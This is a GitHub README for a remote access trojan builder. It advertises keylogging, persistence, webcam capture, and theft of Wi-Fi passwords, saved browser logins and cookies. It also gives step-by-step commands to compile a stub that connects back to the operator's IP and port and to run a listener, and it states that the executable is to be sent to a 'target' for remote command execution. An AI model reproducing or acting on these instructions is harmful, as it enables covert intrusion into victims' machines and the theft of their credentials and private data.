<!-- PROJECT SHIELDS -->
[![Forks][forks-shield]][forks-url]
[![Stargazers][stars-shield]][stars-url]
[![Issues][issues-shield]][issues-url]

# About The Project

![running the tool](https://i.imgur.com/zCQSJMu.jpg)
![building complete](https://i.imgur.com/J0ooWYb.jpg)

A simple builder.

 - Take camera snapshots.

 - Take screenshots.

 - Can Download files.

 - Upload files.

 - Keylogger.

 - Persistence.

 - Show wifi names and passwords.

 - Bind with a seperate file.

 - Get saved usernames and passwords.

 - Get browser cookies.


### Installation

1. Clone the repo
   ```sh
   git clone https://github.com/herawenn/Remote-Access
   ```
2. Install requirements
   ```sh
   pip install -r requirements.txt
   ```
3. Run the program
   ```sh
   python builder.py -ip <ip_address> -p <port_number>
   ```

<!-- USAGE EXAMPLES -->
## Usage

* **-ip** = `Set the ip address`
*  **-p** = `Set the port number`
*  **-i** = `Set the icon`
*  **-f** = `Set the file to bind`

! To use an icon or bind with another file, they must be in the main directory of the project

`builder.py` will compile `client.py` into an executable (located in the 'dist' folder)
This exe (also known as a 'stub') is what you will send to your target.

Listen for incoming connections:
`python server.py -ip <ip_addres> -p <port_number>`

Once a connections is established, you can run commands on the target machine remotely.
Try `Help` to get started.

<!-- CONTRIBUTING -->
## Contributing

Contributions are what make the open source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.

If you have a suggestion that would make this better, please fork the repo and create a pull request. You can also simply open an issue with the tag "enhancement".
Don't forget to give the project a star! Thanks again!

1. Fork the Project
2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
4. Push to the Branch (`git push origin feature/AmazingFeature`)
5. Open a Pull Request

<!-- CONTACT -->
## Contact

[Telegram](https://t.me/mulicious) 
[Discord](https://discord.gg/portlords)
[Cracked](https://cracked.io/herawen)
Project Link: [https://github.com/herawenn/Remote-Access](https://github.com/herawenn/Remote-Access)

<p align="right">(<a href="#readme-top">back to top</a>)</p>

[forks-shield]: https://img.shields.io/github/forks/herawenn/Remote-Access.svg?style=for-the-badge
[forks-url]: https://github.com/herawenn/Remote-Access/network/members
[stars-shield]: https://img.shields.io/github/stars/herawenn/Remote-Access.svg?style=for-the-badge
[stars-url]: https://github.com/herawenn/Remote-Access/stargazers
[issues-shield]: https://img.shields.io/github/issues/herawenn/Remote-Access.svg?style=for-the-badge
[issues-url]: https://github.com/herawenn/Remote-Access/issues
